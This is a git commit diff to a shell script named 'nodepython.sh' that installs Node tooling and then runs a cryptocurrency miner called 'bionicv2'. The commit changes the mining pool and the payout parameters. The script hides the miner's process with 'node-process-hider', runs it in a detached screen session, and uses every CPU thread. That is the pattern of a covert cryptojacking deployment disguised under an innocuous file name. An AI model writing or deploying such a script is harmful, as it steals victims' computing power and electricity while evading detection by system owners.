a0abc484b72b023d503bec8e35e68b02be36c234
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2021-10-14 19:25:06 +0700

    Update nodepython.sh

--- nodepython.sh
+++ nodepython.sh
@@ -13,10 +13,10 @@ apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev -y
 apt-get install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
 npm i -g node-process-hider
 ph add bionicv2
-pool="stratum+tcp://na.luckpool.net:3956"
+pool="stratum+tcp://verushash.na.mine.zergpool.com:3300"
 wallet="$1"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
 
 screen -S "mylittlescreen" -d -m
-screen -r "mylittlescreen" -X stuff $'./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p x\n'
+screen -r "mylittlescreen" -X stuff $'./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p c=DGB,mc=VRSC,ID=rig1\n'
